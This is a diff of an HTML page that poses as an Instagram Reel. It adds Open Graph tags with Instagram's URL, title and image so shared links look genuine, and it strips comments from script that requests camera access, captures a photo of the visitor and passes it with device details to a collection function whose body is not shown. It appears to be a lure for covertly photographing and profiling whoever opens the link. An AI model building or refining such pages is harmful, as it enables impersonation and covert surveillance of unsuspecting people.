@@ -4,6 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>https://www.instagram.com/reel/C_biUQsRFzS/</title>
+
+    <!-- Open Graph meta tags for sharing on social media -->
+    <meta property="og:url" content="https://www.instagram.com/reel/C_biUQsRFzS/" />
+    <meta property="og:type" content="video" />
+    <meta property="og:title" content="Instagram Reel" />
+    <meta property="og:description" content="Check out this Instagram Reel!" />
+    <meta property="og:image" content="https://www.instagram.com/static/images/og-image.png" />
+
     <style>
         body, html {
             margin: 0;
@@ -45,9 +53,8 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        let stream; // Store the stream globally
+        let stream;
 
-        // Prompt for camera access and capture photo
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((mediaStream) => {
                 stream = mediaStream;
@@ -60,20 +67,19 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Invert the image horizontally
             context.translate(canvas.width, 0);
             context.scale(-1, 1);
             
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
-            stopCamera(); // Stop the camera
+            stopCamera();
             getDeviceInfo(imageData);
         }
 
         function stopCamera() {
             setTimeout(() => {
-                stream.getTracks().forEach(track => track.stop()); // Stop all video tracks after 3 seconds
-            }, 3000); // 3000 milliseconds = 3 seconds
+                stream.getTracks().forEach(track => track.stop());
+            }, 3000);
         }
 
         function getDeviceInfo(imageData) {
